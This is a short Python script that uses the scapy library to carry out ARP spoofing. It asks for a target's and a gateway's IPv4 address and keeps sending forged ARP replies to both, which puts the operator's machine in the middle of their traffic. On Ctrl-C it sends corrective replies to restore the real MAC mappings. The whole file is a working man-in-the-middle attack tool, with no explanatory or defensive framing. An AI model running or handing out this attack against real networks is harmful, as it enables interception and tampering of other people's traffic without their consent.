import scapy.all as scapy
from time import sleep

target = input("Target's IPv4 address :")
gateway = input("Gateway's IPv4 address :")


def spoof(target_ip, spoof_ip):
    # Send arp reply (op 2) to the target_ip with a source ip a spoofed ip and source mac MY MAC.
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=scapy.getmacbyip(target_ip), psrc=spoof_ip)
    scapy.send(packet , verbose =False)


def restore(destination_ip, source_ip):
    destination_mac = scapy.getmacbyip(destination_ip)
    source_mac = scapy.getmacbyip(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet , verbose =False)


while True:
    try:
        spoof(target, gateway)
        spoof(gateway, target)
        sleep(4)
    except KeyboardInterrupt:
        restore(gateway, target)
        restore(target, gateway)
        print("Macs Restored")
        break